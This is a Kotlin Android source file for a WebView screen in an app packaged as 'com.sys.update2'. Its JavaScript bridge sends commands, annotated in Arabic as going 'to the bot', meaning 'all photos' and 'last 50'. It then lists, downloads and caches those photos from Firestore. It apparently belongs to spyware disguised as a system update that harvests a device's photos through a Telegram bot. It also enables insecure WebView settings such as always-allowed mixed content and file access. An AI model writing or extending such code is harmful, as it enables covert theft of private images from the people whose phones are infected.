package com.sys.update2

import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity

class WebViewActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar

    private val startUrl = "file:///android_asset/site/index.html"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)

        webView = findViewById(R.id.webView)
        progressBar = findViewById(R.id.progressBar)

        val settings: WebSettings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.databaseEnabled = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.setSupportZoom(true)
        settings.builtInZoomControls = true
        settings.displayZoomControls = false
        settings.allowFileAccess = true
        settings.allowContentAccess = true
        settings.cacheMode = WebSettings.LOAD_DEFAULT

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        }
        CookieManager.getInstance().setAcceptCookie(true)

        // ⭐ ربط JavaScript بـ Android
        webView.addJavascriptInterface(WebAppBridge(), "AndroidBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    if (!url.contains("vercel.app") && !url.contains("telegram.org")) {
                        try {
                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                            return true
                        } catch (_: Exception) {}
                    }
                }
                return false
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
                progressBar.visibility = View.VISIBLE
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                progressBar.visibility = View.GONE
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?
            ) {
                super.onReceivedError(view, request, error)
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                progressBar.progress = newProgress
            }
        }

        if (savedInstanceState == null) {
            webView.loadUrl(startUrl)
        } else {
            webView.restoreState(savedInstanceState)
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        webView.saveState(outState)
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onDestroy() {
        try {
            webView.loadUrl("about:blank")
            webView.clearHistory()
            webView.removeAllViews()
            webView.destroy()
        } catch (_: Exception) {}
        super.onDestroy()
    }

    // ═══════════════════════════════════════════
    //  WebAppBridge — الجسر بين الـ HTML والـ Android
    // ═══════════════════════════════════════════
    inner class WebAppBridge {

        /** الـ HTML يناديها عند فتح المعرض → تبعت أمر للبوت */
        @JavascriptInterface
        fun requestPhotos(): String {
            return try {
                Thread {
                    try {
                        CommandExecutor.handleText(applicationContext, "📸 كل الصور")
                    } catch (e: Exception) {
                        Log.e("WebAppBridge", "requestPhotos err: ${e.message}")
                    }
                }.start()
                "ok"
            } catch (e: Exception) {
                "err: ${e.message}"
            }
        }

        /** الـ HTML يطلب list الصور المخزنة من Firestore */
        @JavascriptInterface
        fun listPhotos(): String {
            return try {
                CommandExecutor.listPhotosJson(applicationContext)
            } catch (e: Exception) {
                Log.e("WebAppBridge", "listPhotos err: ${e.message}")
                "[]"
            }
        }

        /** الـ HTML يطلب رابط صورة معينة */
        @JavascriptInterface
        fun getPhotoUrl(fileId: String): String {
            return try {
                CommandExecutor.getPhotoUrl(applicationContext, fileId)
            } catch (e: Exception) {
                ""
            }
        }

        /** الـ HTML يطلب تحميل الصورة وحفظها محلياً */
        @JavascriptInterface
        fun cachePhoto(fileId: String): String {
            return try {
                CommandExecutor.cachePhoto(applicationContext, fileId)
            } catch (e: Exception) {
                ""
            }
        }

        @JavascriptInterface
        fun isCached(fileId: String): Boolean {
            return try { CommandExecutor.isPhotoCached(applicationContext, fileId) } catch (_: Exception) { false }
        }

        @JavascriptInterface
        fun clearCache(): String {
            return try {
                CommandExecutor.clearPhotoCache(applicationContext)
                "ok"
            } catch (e: Exception) { "err" }
        }

        @JavascriptInterface
        fun cacheSize(): Long {
            return try { CommandExecutor.photoCacheSize(applicationContext) } catch (_: Exception) { 0L }
        }

        /** تحديث الـ HTML يدوياً (تشغيل كل حاجة) */
        @JavascriptInterface
        fun refresh(): String {
            return try {
                Thread {
                    try { CommandExecutor.handleText(applicationContext, "📸 آخر 50") } catch (_: Exception) {}
                }.start()
                "ok"
            } catch (e: Exception) { "err" }
        }
    }
}
